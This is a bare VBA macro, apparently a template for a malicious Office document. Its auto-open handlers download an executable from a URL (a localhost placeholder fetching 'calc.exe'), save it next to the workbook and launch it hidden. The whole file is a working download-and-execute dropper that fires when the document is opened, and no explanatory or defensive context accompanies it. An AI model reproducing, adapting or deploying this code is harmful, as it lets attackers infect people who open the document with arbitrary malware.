Sub Auto_Open()
    MyMacro
End Sub
Sub Workbook_Open()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim fUrl As String
    fUrl = "http://localhost/calc.exe"
    
    Dim objXmlHttpReq As Object
    Dim objStream As Object
    Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
    objXmlHttpReq.Open "GET", fUrl, False, "username", "password"
    objXmlHttpReq.send
    
    If objXmlHttpReq.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1
        objStream.Write objXmlHttpReq.responseBody
        objStream.SaveToFile ThisWorkbook.Path & "\" & "calc.exe", 2
        objStream.Close
    End If
    Wait (2)
    Shell ThisWorkbook.Path + "\calc.exe", vbHide
End Sub
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
